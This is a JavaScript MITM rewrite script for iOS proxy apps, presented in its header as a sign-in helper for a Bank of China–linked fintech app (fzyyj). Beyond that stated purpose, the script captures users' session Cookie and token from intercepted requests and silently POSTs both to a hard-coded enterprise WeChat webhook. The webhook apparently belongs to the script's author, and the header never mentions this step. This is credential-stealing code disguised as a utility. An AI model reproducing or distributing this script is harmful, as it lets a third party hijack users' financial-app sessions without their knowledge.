/*
签到页面，点分享海报即可
===================
[MITM]
hostname = fzyyj-signin.szcy-fintech.com,prod.fzyyj.fintechboc.cn
===================
【Surge配置】 :

===================
[rewrite_local]
^https:\/\/fzyyj-signin\.szcy-fintech\.com\/assets\/save-167ad561\.png$ url script-request-header https://raw.githubusercontent.com/fengyunjay2004/Lexus/refs/heads/main/fzyyj-sign.js

*/

// 自定义环境类，用于日志记录和通知
function Env(name) {
  this.name = name;
  
  /​**​
   * 记录日志
   * @param {string} msg - 日志消息
   */
  this.log = (msg) => {
    console.log(`[${name}] ${msg}`);
    // 将日志保存到持久化存储
    try {
      const existingLogs = $persistentStore.read("debug_logs") || "";
      const timestamp = new Date().toLocaleTimeString();
      const newLog = `${timestamp}: ${msg}\n`;
      $persistentStore.write(existingLogs + newLog, "debug_logs");
    } catch (e) {
      console.log(`保存日志失败: ${e.message}`);
    }
  };
  
  /​**​
   * 发送通知
   * @param {string} title - 通知标题
   * @param {string} subtitle - 通知副标题
   * @param {string} message - 通知内容
   */
  this.notify = (title, subtitle, message) => {
    $notification.post(title, subtitle, message);
    this.log(`通知: ${title} ${subtitle} ${message}`);
  };
  
  /​**​
   * HTTP GET 请求
   * @param {Object} options - 请求选项
   * @returns {Promise<Object>} - 返回响应对象
   */
  this.http = {
    get: async (options) => {
      return new Promise((resolve, reject) => {
        $httpClient.get(options, (error, response, body) => {
          if (error) {
            this.log(`HTTP请求失败: ${error}`);
            reject(error);
          } else {
            this.log(`HTTP请求成功，状态码: ${response.statusCode}`);
            resolve({response, body});
          }
        });
      });
    }
  };
  
  /​**​
   * 标记脚本执行结束
   */
  this.done = () => {
    this.log("脚本执行结束");
    $done({});
  };
}

// 创建环境实例
const env = new Env("云游脚本");

// 检查是否存在请求对象
if ($request) {
    // 获取请求的URL
    let url = $request.url;
    
    // 使用正则表达式匹配以 "https://fzyyj-signin.szcy-fintech.com/fzyyj/game/" 开头的URL
    const urlPattern = /^https:\/\/fzyyj-signin\.szcy-fintech\.com\/fzyyj\/game\/.*/;
    
    if (urlPattern.test(url)) {
        // 从请求头中获取Cookie
        let cookie = $request.headers['Cookie'];
        
        if (cookie) {
            // 将Cookie保存到本地存储，键名为"cookieKey"
            $prefs.setValueForKey(cookie, "cookieKey");  // 保存 Cookie 到本地存储
            env.log(`保存的Cookie值:\n${cookie}`);
            
            // 使用正则表达式从Cookie中提取token
            let tokenMatch = cookie.match(/token=([^;]+)/);
            
            if (tokenMatch) {
                // 提取到的 token 值
                let authorization = tokenMatch[1].replace(/%20/g, " ");  // 将 %20 替换为空格
                
                // 将提取到的Authorization保存到本地存储，键名为"AuthorizationKey"
                $prefs.setValueForKey(authorization, "AuthorizationKey");  
                
                // 准备通知消息
                let message1 = `Cookie值:\n${cookie}`;
                let message2 = `Authorization值:\n${authorization}`;
                
                // 发送本地通知，显示提取的Authorization
                env.notify("云游成功获取CK和Authorization", "", `以下是获取到的Cookie值\n${cookie}\n\n以下是获取到的Authorization值\n${authorization}`);
                env.log(`云游\n以下是获取到的Cookie值\n${cookie}\n\n以下是获取到的Authorization值\n${authorization}`);

                // 企业微信Webhook URL
                let wechatWebhookUrl = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=284b000b-784b-40b4-8a4a-893f4ab3b4b8"; 
                
                // 准备第一条企业微信消息
                let wechatMessage1 = {
                    "msgtype": "text",
                    "text": {
                        "content": `${message1}`
                    }
                };
                
                // 准备第二条企业微信消息
                let wechatMessage2 = {
                    "msgtype": "text",
                    "text": {
                        "content": `${message2}`
                    }
                };
                
                /​**​
                 * 发送企业微信消息的函数
                 * @param {string} webhookUrl - 企业微信Webhook URL
                 * @param {Object} message - 消息对象
                 * @returns {Promise<boolean>} - 发送是否成功
                 */
                const sendWeChatMessage = (webhookUrl, message) => {
                    return new Promise((resolve, reject) => {
                        let options = {
                            url: webhookUrl,
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(message)
                        };
                        
                        $task.fetch(options).then(response => {
                            env.log(`企业微信消息发送成功: ${response.body}`);
                            resolve(true);
                        }).catch(reason => {
                            env.log(`企业微信消息发送失败: ${reason.error}`);
                            resolve(false); // 即使发送失败，也继续执行后续逻辑
                        });
                    });
                };
                
                // 发送第一条消息
                sendWeChatMessage(wechatWebhookUrl, wechatMessage1)
                    .then(success1 => {
                        if (success1) {
                            // 如果第一条消息发送成功，发送第二条消息
                            return sendWeChatMessage(wechatWebhookUrl, wechatMessage2);
                        } else {
                            // 第一条消息发送失败，仍然尝试发送第二条消息
                            return sendWeChatMessage(wechatWebhookUrl, wechatMessage2);
                        }
                    })
                    .then(success2 => {
                        if (success2) {
                            env.log("所有企业微信消息发送成功");
                        } else {
                            env.log("部分企业微信消息发送失败");
                        }
                        env.done(); // 在消息发送完成后调用 $done()
                    });
            } 
        } else {
            // 如果未找到Cookie，发送本地通知提示失败
            env.notify("失败", "", "未找到，请检查请求头");  // 未找到 X-XSRF-TOKEN 和 Token 时通知
            env.log("未找到Cookie，脚本结束");
            env.done(); // 未找到 token 时调用 $done()
        }
    } else {
        // 如果URL不匹配，直接调用 $done() 结束脚本
        env.log("URL 不匹配，脚本结束");
        env.done(); // URL 不匹配时调用 $done()
    }
} else {
    // 如果没有请求对象，直接调用 $done() 结束脚本
    env.log("没有请求对象，脚本结束");
    env.done();
}
